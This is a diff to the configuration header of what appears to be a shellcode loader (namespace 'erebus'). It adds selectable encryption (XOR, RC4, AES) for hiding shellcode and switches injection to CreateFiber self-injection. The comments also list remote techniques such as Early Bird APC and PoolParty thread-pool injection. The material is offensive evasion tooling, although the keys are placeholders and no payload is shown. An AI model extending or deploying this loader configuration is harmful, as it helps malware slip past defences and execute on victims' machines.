@@ -3,6 +3,34 @@
 #pragma once
 
 // ============================================
+// ENCRYPTION CONFIGURATION
+// ============================================
+
+// Encryption method used for shellcode:
+// 0 = NONE        - No decryption
+// 1 = XOR         - Simple XOR cipher
+// 2 = RC4         - RC4 stream cipher
+// 3 = AES_ECB     - AES in ECB mode
+// 4 = AES_CBC     - AES in CBC mode
+#define CONFIG_ENCRYPTION_TYPE 1
+
+#if CONFIG_ENCRYPTION_TYPE == 1
+#define DecryptShellcode erebus::DecryptionXor
+#elif CONFIG_ENCRYPTION_TYPE == 2
+#define DecryptShellcode erebus::DecryptionRc4
+#endif
+
+// Encryption key (define as needed)
+// Note: Key size depends on encryption type:
+// - XOR: any size (repeating key)
+// - RC4: 1-256 bytes
+// - AES: 16, 24, or 32 bytes (128, 192, 256 bits)
+#define CONFIG_ENCRYPTION_KEY { 0x00, 0x00 }
+
+// For AES_CBC mode, define the IV (must be 16 bytes)
+#define CONFIG_ENCRYPTION_IV { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
+
+// ============================================
 // INJECTION CONFIGURATION
 // ============================================
 
@@ -15,7 +43,7 @@
 // 3 = CreateFiber         - Fiber-based execution (Self)
 // 4 = EarlyCascade        - Early Bird APC injection (Remote)
 // 5 = PoolParty           - Worker Factory thread pool injection (Remote)
-#define CONFIG_INJECTION_TYPE 1
+#define CONFIG_INJECTION_TYPE 3
 
 #if CONFIG_INJECTION_TYPE == 3
 #define CONFIG_INJECTION_MODE 2  // Self injection
